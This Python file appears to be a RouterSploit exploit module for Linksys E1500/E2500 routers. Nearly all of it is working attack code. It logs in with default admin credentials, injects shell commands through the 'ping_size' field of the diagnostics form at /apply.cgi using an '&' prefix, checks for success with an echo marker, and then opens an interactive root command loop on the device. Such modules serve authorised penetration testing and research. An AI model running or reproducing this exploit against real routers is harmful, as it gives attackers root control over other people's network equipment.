from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Linksys E1500/E2500",
        "description": "Module exploits remote command execution in Linksys E1500/E2500 devices. "
                       "Diagnostics interface allows executing root privileged shell commands is "
                       "available on dedicated web pages on the device.",
        "authors": (
            "Michael Messner",  # vulnerability discovery
            "Esteban Rodriguez (n00py)",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/24475/",
        ),
        "devices": (
            "Linksys E1500/E2500",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    username = OptString("admin", "Username to login with")
    password = OptString("admin", "Password to login with")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available")
            shell(self)
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        data = {
            "submit_button": "Diagnostics",
            "change_action": "gozila_cgi",
            "submit_type": "start_ping",
            "action": "",
            "commit": "0",
            "ping_ip": "127.0.0.1",
            "ping_size": "&" + cmd,
            "ping_times": "5",
            "traceroute_ip": "127.0.0.1"
        }

        self.http_request(
            method="POST",
            path="/apply.cgi",
            data=data,
            auth=(self.username, self.password)
        )

        return ""

    @mute
    def check(self):
        mark = utils.random_text(32)
        cmd = "echo {}".format(mark)
        data = {
            "submit_button":
            "Diagnostics",
            "change_action": "gozila_cgi",
            "submit_type": "start_ping",
            "action": "",
            "commit": "0",
            "ping_ip": "127.0.0.1",
            "ping_size": "&" + cmd,
            "ping_times": "5",
            "traceroute_ip": "127.0.0.1"
        }

        response = self.http_request(
            method="POST",
            path="/apply.cgi",
            data=data,
            auth=(self.username, self.password)
        )
        if response is None:
            return False  # target is not vulnerable

        if mark in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
